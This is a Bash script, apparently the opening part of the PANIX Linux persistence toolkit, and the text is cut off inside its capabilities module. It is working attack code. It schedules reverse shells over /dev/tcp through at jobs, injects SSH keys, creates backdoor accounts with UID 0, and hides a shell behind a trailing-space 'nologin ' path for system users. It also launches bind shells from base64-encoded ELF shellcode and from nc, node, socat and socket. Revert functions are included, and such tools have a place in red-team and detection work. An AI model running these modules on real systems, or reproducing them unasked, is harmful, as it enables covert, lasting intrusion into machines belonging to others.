#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'

print_banner() {
	echo ""
	echo " __                      "
	echo "|__)  /\  |\\ | | \\_/   "
	echo "|    /~~\\ | \\| | / \\  "
	echo "                         "
	echo "@RFGroenewoud"
	echo ""
}

check_root() {
	if [[ $EUID -ne 0 ]]; then
		return 1
	else
		return 0
	fi
}

usage_user() {
	echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
	echo ""
	echo "Low Privileged User Options:"
	echo ""
	echo "  --at                   At job persistence"
	echo "  --authorized-keys      Add public key to authorized keys"
	echo "  --bind-shell           Execute backgrounded bind shell (supports multiple LOLBins)"
	echo "  --cron                 Cron job persistence"
	echo "  --git                  Git persistence"
	echo "  --malicious-container  Docker container with host escape (requires docker group permissions)"
	echo "  --reverse-shell        Reverse shell persistence (supports multiple LOLBins)"
	echo "  --shell-profile        Shell profile persistence"
	echo "  --ssh-key              SSH key persistence"
	echo "  --systemd              Systemd service persistence"
	echo "  --tmpfiles             systemd-tmpfiles.d persistence"
	echo "  --web-shell            Web shell persistence (PHP/Python)"
	echo "  --xdg                  XDG autostart persistence"
	echo "  --revert               Revert most changes made by PANIX' default options"
	echo "  --mitre-matrix         Display the MITRE ATT&CK Matrix for PANIX"
	echo "  --quiet (-q)           Quiet mode (no banner)"
}

usage_root() {
	echo ""
	echo "Root User Options:"
	echo ""
	echo "  --at                   At job persistence"
	echo "  --authorized-keys      Add public key to authorized keys"
	echo "  --backdoor-user        Create backdoor user"
	echo "  --backdoor-system-user Create backdoor system user"
	echo "  --bind-shell           Execute backgrounded bind shell (supports multiple LOLBins)"
	echo "  --cap                  Add capabilities persistence"
	echo "  --create-user          Create a new user"
	echo "  --cron                 Cron job persistence"
	echo "  --dbus                 D-Bus service persistence"
	echo "  --generator            Generator persistence"
	echo "  --git                  Git hook/pager persistence"
	echo "  --grub                 GRUB bootloader persistence"
	echo "  --initd                SysV Init (init.d) persistence"
	echo "  --initramfs            Initramfs persistence"
	echo "  --ld-preload           LD_PRELOAD backdoor persistence"
	echo "  --lkm                  Loadable Kernel Module (LKM) persistence"
	echo "  --malicious-container  Docker container with host escape"
	echo "  --malicious-package    Build and Install a package for persistence (DPKG/RPM)"
	echo "  --motd                 Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
	echo "  --network-manager      NetworkManager dispatcher script persistence"
	echo "  --package-manager      Package Manager persistence (APT/YUM/DNF)"
	echo "  --pam                  Pluggable Authentication Module (PAM) persistence (backdoored PAM & pam_exec)"
	echo "  --passwd-user          Add user to /etc/passwd directly"
	echo "  --password-change      Change user password"
	echo "  --polkit               Allow pkexec as any user through Polkit"
	echo "  --rc-local             Run Control (rc.local) persistence"
	echo "  --reverse-shell        Reverse shell persistence (supports multiple LOLBins)"
	echo "  --rootkit              Diamorphine (LKM) rootkit persistence"
	echo "  --shell-profile        Shell profile persistence"
	echo "  --ssh-key              SSH key persistence"
	echo "  --sudoers              Sudoers persistence"
	echo "  --suid                 SUID persistence"
	echo "  --system-binary        System binary persistence"
	echo "  --systemd              Systemd service persistence"
	echo "  --tmpfiles             systemd-tmpfiles.d persistence"
	echo "  --udev                 Udev (driver) persistence"
	echo "  --web-shell            Web shell persistence (PHP/Python)"
	echo "  --xdg                  XDG autostart persistence"
	echo "  --revert               Revert most changes made by PANIX' default options"
	echo "  --mitre-matrix         Display the MITRE ATT&CK Matrix for PANIX"
	echo "  --quiet (-q)           Quiet mode (no banner)"
	echo ""
}

# All revert functions
revert_all() {
	echo "[+] Reverting all modules..."
	
	local modules=(
		revert_at
		revert_authorized_keys
		revert_backdoor_user
		revert_bind_shell
		revert_cap
		revert_create_user
		revert_cron
		revert_dbus
		revert_generator
		revert_git
		revert_grub
		revert_initd
		revert_initramfs
		revert_ld_preload
		revert_lkm
		revert_malicious_container
		revert_malicious_package
		revert_motd_backdoor
		revert_network_manager
		revert_package_manager
		revert_pam
		revert_passwd_user
		revert_password_change
		revert_polkit
		revert_rc_local
		revert_reverse_shell
		revert_rootkit
		revert_shell_profile
		revert_ssh_key
		revert_sudoers
		revert_suid
		revert_system_binary
		revert_systemd
		revert_tmpfiles
		revert_udev
		revert_web_shell
		revert_xdg
	)

	# Disable exit on error
	set +e

	for module in "${modules[@]}"; do
		echo ""
		echo "######################### [+] Reverting $module... #########################"
		echo ""

		# Check if the module exists
		if ! command -v "$module" &>/dev/null; then
			echo "[-] Function $module not found. Skipping..."
			continue
		fi

		# Execute the module and capture its exit status
		"$module"
		local exit_code=$?
		if [[ $exit_code -eq 0 ]]; then
			echo ""
			echo "[+] $module reverted successfully."
			echo ""
		else
			echo ""
			echo "[-] Failed to revert $module. Exit Code: $exit_code"
			echo ""
		fi
	done

	# Re-enable exit on error
	set -e

	echo "[+] Reversion of all modules complete."
}


# Module: setup_at.sh
setup_at() {
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local time=""

	usage_at() {
		echo "Usage: ./panix.sh --at [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default at settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
		echo "--custom                     Use custom at settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
        echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--time )
				shift
				time=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
				exit 0
				;;
			--help|-h)
				usage_at
				exit 0
				;;
			* )
				echo "Invalid option for --at: $1"
				echo "Try './panix.sh --at --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v at &> /dev/null; then
		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --at --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port || -z $time ]]; then
			echo "Error: --ip, --port, and --time must be specified when using --default."
			echo "Try './panix.sh --at --help' for more information."
			exit 1
		fi
		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $time ]]; then
			echo "Error: --command and --time must be specified when using --custom."
			echo "Try './panix.sh --at --help' for more information."
			exit 1
		fi
		echo "$command" | at $time
	else
		echo "Error: Either --default or --custom must be specified for --at."
		echo "Try './panix.sh --at --help' for more information."
		exit 1
	fi

	echo "[+] At job persistence established!"
}

# Revert Module: revert_at.sh
revert_at() {
	usage_revert_at() {
		echo "Usage: ./panix.sh --revert at"
		echo "Reverts any changes made by the setup_at module."
	}

	if ! command -v at &> /dev/null; then
		echo "Error: 'at' binary is not present. Cannot revert 'at' jobs."
		return 1
	fi

	# Fetch all queued `at` jobs
	jobs=$(atq | awk '{print $1}')
	if [[ -z "$jobs" ]]; then
		echo "[-] No 'at' jobs found to revert."
		return 0
	fi

	# Iterate over each job, check its command, and remove if it matches known patterns
	for job in $jobs; do
		job_info=$(at -c "$job")
		if [[ "$job_info" =~ "sh -i >& /dev/tcp" || "$job_info" =~ "/bin/bash -c" ]]; then
			atrm "$job"
			echo "[+] Removed matching 'at' job with ID $job."
		fi
	done

    return 0
}

# Module: setup_authorized_keys.sh
setup_authorized_keys() {
	local key=""
	local path=""
	local default=0
	local custom=0

	usage_authorized_keys() {
		if check_root; then
			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "--custom                     Use custom authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "  --path <path>                Specify custom authorized keys file path"
            echo "--help|-h                    Show this help message"
		else
			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
            echo "--help|-h                    Show this help message"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --authorized-keys --default --key <public_key>"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
				exit 0
				;;
			--help|-h)
				usage_authorized_keys
				exit 0
				;;
			* )
				echo "Invalid option for --authorized-keys: $1"
				echo "Try './panix.sh --authorized-keys --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --authorized-keys --help' for more information."
		exit 1
	elif [[ -z $key ]]; then
		echo "Error: --key must be specified."
		echo "Try './panix.sh --authorized-keys --help' for more information."
		exit 1
	fi

	if check_root; then
		if [[ $default -eq 1 ]]; then
			path="/root/.ssh/authorized_keys"
		elif [[ $custom -eq 1 && -n $path ]]; then
			mkdir -p $(dirname $path)
		else
			echo "Error: --path must be specified with --custom for root."
			echo "Try './panix.sh --authorized-keys --help' for more information."
			exit 1
		fi
	else
		if [[ $default -eq 1 ]]; then
			local current_user=$(whoami)
			path="/home/$current_user/.ssh/authorized_keys"
		else
			echo "Error: Only root can use --custom for --authorized-keys."
			echo "Try './panix.sh --authorized-keys --help' for more information."
			exit 1
		fi
	fi

	mkdir -p $(dirname $path)
	echo "[+] Backing up authorized_keys file to $path.bak"
	cp $path $path.bak
	echo $key >> $path
	chmod 600 $path

	echo "[+] Authorized_keys persistence established!"
}

# Revert Module: revert_authorized_keys.sh
revert_authorized_keys() {
	local path=""

	usage_revert_authorized_keys() {
		echo "Usage: ./panix.sh --revert authorized-keys"
		echo "Reverts any changes made by the setup_authorized_keys module."
	}

	if check_root; then
		path="/root/.ssh/authorized_keys"
	else
		local current_user=$(whoami)
		path="/home/$current_user/.ssh/authorized_keys"
	fi

	if [[ -f "${path}.bak" ]]; then
		echo "[+] Restoring backup from ${path}.bak to $path."
		mv "${path}.bak" "$path"
		chmod 600 "$path"
		echo "[+] Revert complete: Restored $path from backup."
		return 1
	else
		echo "[-] Backup file ${path}.bak not found. No changes made."
		return 0
	fi

	return 0
}

# Module: setup_backdoor_system_user.sh
setup_backdoor_system_user() {
	local key=""
	local user=""
	local path=""
	local default=0
	local custom=0

	usage_backdoor_system_user() {
		echo "Usage: ./panix.sh --backdoor-system-user [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default authorized keys settings"
		echo "  --key <key>                  Specify the public key"
		echo "--custom                     Use custom settings for a specified user"
		echo "  --user <user>                Specify the user"
		echo "  --key <key>                  Specify the public key"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--user )
				shift
				user=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --backdoor-system-user --default --key <public_key>"
				echo "--custom:"
				echo "./panix.sh --backdoor-system-user --custom --user <username> --key <public_key>"
				exit 0
				;;
			--help|-h)
				usage_backdoor_system_user
				exit 0
				;;
			* )
				echo "Invalid option for --backdoor-system-user: $1"
				echo "Try './panix.sh --backdoor-system-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --backdoor-system-user --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $key ]]; then
			echo "Error: --key must be specified with --default."
			echo "Try './panix.sh --backdoor-system-user --help' for more information."
			exit 1
		fi

		# Locate the 'news' user
		local user_entry=$(grep "^news:" /etc/passwd)
		if [[ -z "$user_entry" ]]; then
			# Fallback to 'nobody' user
			user_entry=$(grep "^nobody:" /etc/passwd)
			if [[ -z "$user_entry" ]]; then
				echo "Error: Neither 'news' nor 'nobody' user exists on this system."
				exit 1
			fi
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $user || -z $key ]]; then
			echo "Error: Both --user and --key must be specified with --custom."
			echo "Try './panix.sh --backdoor-system-user --help' for more information."
			exit 1
		fi

		# Locate the specified user
		user_entry=$(grep "^$user:" /etc/passwd)
		if [[ -z "$user_entry" ]]; then
			echo "Error: Specified user '$user' does not exist in /etc/passwd."
			exit 1
		fi

		# Check if the user's shell is /bin/false
		local user_shell=$(echo "$user_entry" | cut -d: -f7)
		if [[ "$user_shell" == "/bin/false" ]]; then
			echo "Error: Specified user '$user' has '/bin/false' as their shell. Please choose another user."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --backdoor-system-user --help' for more information."
		exit 1
	fi

	# Extract the home directory for the user
	local home_dir=$(echo "$user_entry" | cut -d: -f6)
	if [[ -z "$home_dir" ]]; then
		echo "Error: Unable to determine the home directory for the user."
		exit 1
	fi

	# Create the .ssh directory
	mkdir -p "$home_dir/.ssh"
	chmod 755 "$home_dir/.ssh"  # Set directory permissions to be accessible by others

	# Write the public key to authorized_keys
	echo "$key" > "$home_dir/.ssh/authorized_keys"
	chmod 644 "$home_dir/.ssh/authorized_keys"  # Set file permissions to be readable by others

	echo "[+] Authorized_keys persistence established for user: $(echo "$user_entry" | cut -d: -f1)"

	# Check and add "nologin " to /etc/shells if not already present
	if ! grep -q "nologin " /etc/shells; then
		echo "nologin " >> /etc/shells
		echo "[+] Added 'nologin ' to /etc/shells"
	else
		echo "[+] 'nologin ' already exists in /etc/shells. Skipping."
	fi

	# Copy /bin/dash to '/usr/sbin/nologin '
	cp /bin/dash "/usr/sbin/nologin "
	echo "[+] Copied /bin/dash to '/usr/sbin/nologin '"

	# Modify /etc/passwd to include the trailing space in the shell path
	local username=$(echo "$user_entry" | cut -d: -f1)
	sed -i "/^$username:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |" /etc/passwd
	echo "[+] Modified /etc/passwd to update shell path for user: $username"

	echo "[+] System user backdoor persistence established for user: $(echo "$user_entry" | cut -d: -f1)"
}

# Revert Module: revert_backdoor_system_user.sh
revert_backdoor_system_user() {
	usage_revert_backdoor_system_user() {
		echo "Usage: ./panix.sh --revert backdoor-system-user"
		echo "Reverts any changes made by the setup_backdoor_system_user module for the default option."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Define users to check
	# Add custom users here if you want to revert them
	local users=("news" "nobody")

	for user in "${users[@]}"; do
		# Check if user exists in /etc/passwd
		user_entry=$(grep "^$user:" /etc/passwd)
		if [[ -n "$user_entry" ]]; then
			# Extract home directory
			home_dir=$(echo "$user_entry" | cut -d: -f6)

			if [[ -d "$home_dir/.ssh" ]]; then
				# Remove the .ssh directory
				echo "[+] Removing .ssh directory for user: $user"
				rm -rf "$home_dir/.ssh"
				if [[ $? -eq 0 ]]; then
					echo "[+] Successfully removed .ssh directory for $user."
				else
					echo "[-] Failed to remove .ssh directory for $user."
				fi
			else
				echo "[+] No .ssh directory found for $user."
			fi

			# Restore /etc/passwd entry for the user
			echo "[+] Checking /etc/passwd entry for user: $user"
			if grep -q ":$home_dir:/usr/sbin/nologin " /etc/passwd; then
				echo "[+] Reverting /etc/passwd entry for user: $user"
				sed -i "s|:$home_dir:/usr/sbin/nologin |:$home_dir:/usr/sbin/nologin|" /etc/passwd
				if [[ $? -eq 0 ]]; then
					echo "[+] Successfully reverted /etc/passwd entry for $user."
				else
					echo "[-] Failed to revert /etc/passwd entry for $user."
				fi
			else
				echo "[+] No modifications found for /etc/passwd entry of user: $user. Skipping."
			fi
		fi
	done

	# Remove '/usr/sbin/nologin ' if it exists
	if [[ -f "/usr/sbin/nologin " ]]; then
		echo "[+] Removing '/usr/sbin/nologin '"
		rm -f "/usr/sbin/nologin "
		if [[ $? -eq 0 ]]; then
			echo "[+] Successfully removed '/usr/sbin/nologin '."
		else
			echo "[-] Failed to remove '/usr/sbin/nologin '."
		fi
	else
		echo "[+] '/usr/sbin/nologin ' not found. Skipping."
	fi

	# Revert changes to /etc/shells
	if grep -q "nologin " /etc/shells; then
		echo "[+] Reverting /etc/shells to remove 'nologin ' entry."
		sed -i '/nologin /d' /etc/shells
		if [[ $? -eq 0 ]]; then
			echo "[+] Successfully removed 'nologin ' from /etc/shells."
		else
			echo "[-] Failed to revert changes in /etc/shells."
		fi
	else
		echo "[+] 'nologin ' not found in /etc/shells. Skipping."
	fi

	return 0
}

# Module: setup_backdoor_user.sh
setup_backdoor_user() {
	local username=""

	usage_backdoor_user() {
		echo "Usage: ./panix.sh --backdoor-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
        echo "--help|-h                  Show this help message"
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --backdoor-user --username <username>"
				exit 0
				;;
			--help|-h)
				usage_backdoor_user
				exit 0
				;;
			* )
				echo "Invalid option for --backdoor-user: $1"
				echo "Try './panix.sh --backdoor-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './panix.sh --backdoor-user --help' for more information."
		exit 1
	fi

	usermod -u 0 -o $username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username has been modified to have UID 0 (root privileges)."
	else
		echo "[-] Failed to modify user $username."
		exit 1
	fi
	echo "[+] Backdoor user persistence established!"
}

# Revert Module: revert_backdoor_user.sh
revert_backdoor_user() {
	usage_revert_backdoor_user() {
		echo "Usage: ./panix.sh --revert backdoor-user"
		echo "Reverts any changes made by the setup_backdoor_user module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Find users with UID 0 and not named 'root'
	backdoor_users=$(awk -F: '($3 == 0) && ($1 != "root") {print $1}' /etc/passwd)

	if [[ -z "$backdoor_users" ]]; then
		echo "[+] No backdoor users found."
		return 0
	fi

	for username in $backdoor_users; do
		echo "[+] Found backdoor user: $username"

		# Get next available UID above 1000
		next_uid=$(awk -F: 'BEGIN {max=999} ($3>=1000 && $3>max) {max=$3} END {print max+1}' /etc/passwd)

		# Backup /etc/passwd before making changes
		cp /etc/passwd /etc/passwd.bak
		echo "[+] Backup of /etc/passwd created at /etc/passwd.bak"

		# Use sed to change the UID from 0 to next available UID
		sed -i "s/^\($username:[^:]*:\)0:/\1$next_uid:/" /etc/passwd

		if [[ $? -eq 0 ]]; then
			echo "[+] Changed UID of $username to $next_uid in /etc/passwd."
		else
			echo "[-] Failed to change UID for user $username."
		fi
	done

	return 0
}

# Module: setup_bind_shell.sh
setup_bind_shell() {
	local default=0
	local custom=0
	local shellcode=0
	local lolbin=0
	local architecture=""
	local binary=""
	local nc=0
	local node=0
	local socat=0
	local socket=0

	usage_bind_shell() {
		echo "Usage: ./panix.sh --bind-shell [OPTIONS]"
		echo "--examples                                Display command examples"
		echo "--default                                 Use default bind shell settings"
		echo "  --shellcode                               Use shellcode for bind shell"
		echo "    --architecture <arch>                     Specify architecture (x86 or x64)"
		echo "  --lolbin                                Use LOLBIN for bind shell"
		echo "    --nc | --node | --socat | --socket      Specify LOLBIN to use"
		echo "    --port <port>                             Specify port to bind shell to"
		echo "--custom                                  Use custom bind shell binary"
		echo "  --binary <binary>                         Specify the path to the custom binary"
        echo "--help|-h                                 Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--shellcode )
				shellcode=1
				;;
			--lolbin )
				lolbin=1
				;;
			--architecture )
				shift
				architecture=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--nc )
				nc=1
				;;
			--node )
				node=1
				;;
			--socat )
				socat=1
				;;
			--socket )
				socket=1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --bind-shell --default --shellcode --architecture x86"
				echo "sudo ./panix.sh --bind-shell --default --lolbin --nc --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --bind-shell --custom --binary \"/tmp/bindshell\""
				exit 0
				;;
			--help|-h)
				usage_bind_shell
				exit 0
				;;
			* )
				echo "Invalid option for --bind-shell: $1"
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate argument combinations
	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ $shellcode -eq 0 && $lolbin -eq 0 ]]; then
			echo "Error: --default requires either --shellcode or --lolbin."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ $shellcode -eq 1 ]]; then
			if [[ -z $architecture ]]; then
				echo "Error: --architecture (x64/x86) must be specified when using --shellcode."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			case $architecture in
				x86 )
					echo "[+] Using shellcode for x86 architecture..."
					echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
					chmod +x /tmp/bd86
					/tmp/bd86 &
					echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
					;;
				x64 )
					echo "[+] Using shellcode for x64 architecture..."
					echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
					chmod +x /tmp/bd64
					/tmp/bd64 &
					echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
					;;
				* )
					echo "Error: Invalid architecture specified. Use one of x86 or x64."
					echo "Try './panix.sh --bind-shell --help' for more information."
					exit 1
			esac
			echo "[+] Bind shell persistence established!"
			echo "[+] The bind shell is listening on port 9001."
			echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
		fi

		if [[ $lolbin -eq 1 ]]; then
			if [[ $nc -eq 0 && $node -eq 0 && $socat -eq 0 && $socket -eq 0 ]]; then
				echo "Error: --lolbin requires one of --nc, --node, --socat, or --socket."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			if [[ -z $port ]]; then
				echo "Error: --port must be specified when using --lolbin."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			# Ref: https://gtfobins.github.io/gtfobins/nc/#bind-shell
			if [[ $nc -eq 1 ]]; then
				echo "[+] Checking for Netcat (nc.traditional) on the system..."
				if command -v nc.traditional &>/dev/null; then
					echo "[+] Netcat (nc.traditional) is available. Starting bind shell on port $port..."
					nc.traditional -l -p "$port" -e /bin/sh &
					echo "[+] Netcat bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
					echo "    nc <target.com> $port"
					echo "    telnet <target.com> $port"
				elif command -v nc &>/dev/null; then
					echo "[+] Checking if Netcat (nc) supports the -e option..."
					if nc -h 2>&1 | grep -q -- "-e"; then
						echo "[+] Netcat (nc) supports -e. Starting bind shell on port $port..."
						nc -l -p "$port" -e /bin/sh &
						echo "[+] Netcat bind shell running in the background on port $port."
						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
						echo "    nc <target.com> $port"
						echo "    telnet <target.com> $port"
					else
						echo "[-] Netcat (nc) does not support the -e option. Cannot use Netcat for bind shell."
					fi
				else
					echo "[-] Neither nc.traditional nor nc with -e option is available. Cannot use Netcat for bind shell."
				fi
			fi

			# https://gtfobins.github.io/gtfobins/node/#bind-shell
			if [[ $node -eq 1 ]]; then
				echo "[+] Checking for Node.js on the system..."
				if command -v node &>/dev/null; then
					echo "[+] Node.js is available. Starting bind shell on port $port..."

					# Start the bind shell using Node.js
					node -e "
						const sh = require('child_process').spawn('/bin/sh');
						require('net').createServer(client => {
							client.pipe(sh.stdin);
							sh.stdout.pipe(client);
							sh.stderr.pipe(client);
						}).listen($port);
					" &

					if [[ $? -eq 0 ]]; then
						echo "[+] Node.js bind shell running in the background on port $port."
						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
						echo "    nc <target.com> $port"
						echo "    telnet <target.com> $port"
					else
						echo "[-] Failed to start Node.js bind shell."
					fi
				else
					echo "[-] Node.js is not available on this system. Cannot use Node.js for bind shell."
				fi
			fi
			
			# Ref: https://gtfobins.github.io/gtfobins/socat/#bind-shell
			if [[ $socat -eq 1 ]]; then
				echo "[+] Checking for Socat on the system..."
				if command -v socat &>/dev/null; then
					echo "[+] Socat is available. Starting bind shell on port $port..."
					socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane &
					echo "[+] Socat bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, run:"
					echo "    socat FILE:\`tty\`,raw,echo=0 TCP:<target.com>:$port"
				else
					echo "[-] Socat is not available on this system. Cannot use Socat for bind shell."
				fi
			fi

			# Ref: https://gtfobins.github.io/gtfobins/socket/#bind-shell
			if [[ $socket -eq 1 ]]; then
				echo "[+] Checking for Socket on the system..."
				if command -v socket &>/dev/null; then
					echo "[+] Socket is available. Starting bind shell on port $port..."
					setsid nohup socket -svp '/bin/sh -i' $port &
					echo "[+] Socket bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
					echo "    nc <target.com> $port"
					echo "    telnet <target.com> $port"
				else
					echo "[-] Socket is not available on this system. Cannot use Socket for bind shell."
				fi
			fi
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified when using --custom."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ ! -f $binary ]]; then
			echo "Error: Specified binary does not exist: $binary."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		chmod +x $binary
		$binary &
		echo "[+] Custom binary $binary is executed and running in the background."
		echo "[+] Bind shell persistence established!"
	else
		echo "Error: Either --default or --custom must be specified for --bind-shell."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi
}

# Revert Module: revert_bind_shell.sh
revert_bind_shell() {
	usage_revert_bind_shell() {
		echo "Usage: ./panix.sh --revert bind-shell"
		echo "Reverts any changes made by the setup_bind_shell module."
	}

	# Kill any running bind shell processes started by setup_bind_shell

	echo "[+] Searchnig for bind shell processes and killing them if present..."

	# Kill shellcode bind shells (/tmp/bd86 and /tmp/bd64)
	if [[ -f /tmp/bd86 ]]; then
		echo "[+] Found /tmp/bd86 binary. Killing process and removing binary..."
		pkill -f "/tmp/bd86"
		rm -f /tmp/bd86
	fi

	if [[ -f /tmp/bd64 ]]; then
		echo "[+] Found /tmp/bd64 binary. Killing process and removing binary..."
		pkill -f "/tmp/bd64"
		rm -f /tmp/bd64
	fi

	# Kill netcat bind shell processes
	if pgrep -f "nc\.traditional.*-l.*-p" > /dev/null; then
		echo "[+] Found Netcat (nc.traditional) bind shell process(es). Killing..."
		pkill -f "nc\.traditional.*-l.*-p"
	fi

	if pgrep -f "nc.*-l.*-p" > /dev/null; then
		echo "[+] Found Netcat bind shell process(es). Killing..."
		pkill -f "nc.*-l.*-p"
	fi

	# Kill Node.js bind shell processes
	if pgrep -f "node -e" > /dev/null; then
		echo "[+] Found Node.js bind shell process(es). Killing..."
		pkill -f "node -e"
	fi

	# Kill Socat bind shell processes
	if pgrep -f "socat TCP-LISTEN" > /dev/null; then
		echo "[+] Found Socat bind shell process(es). Killing..."
		pkill -f "socat TCP-LISTEN"
	fi

	# Kill Socket bind shell processes
	if pgrep -f "socket -svp" > /dev/null; then
		echo "[+] Found Socket bind shell process(es). Killing..."
		pkill -f "socket -svp"
	fi

	# Remove custom binary if known
	# If a custom binary path was used, it should be stored or known; assuming /tmp/custom_bind_shell
	if [[ -f /tmp/custom_bind_shell ]]; then
		echo "[+] Found custom bind shell binary at /tmp/custom_bind_shell. Killing process and removing binary..."
		pkill -f "/tmp/custom_bind_shell"
		rm -f /tmp/custom_bind_shell
	fi

	return 0
}

# Module: setup_cap_backdoor.sh
setup_cap_backdoor() {
	local default=0
	local custom=0
	local capability=""
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

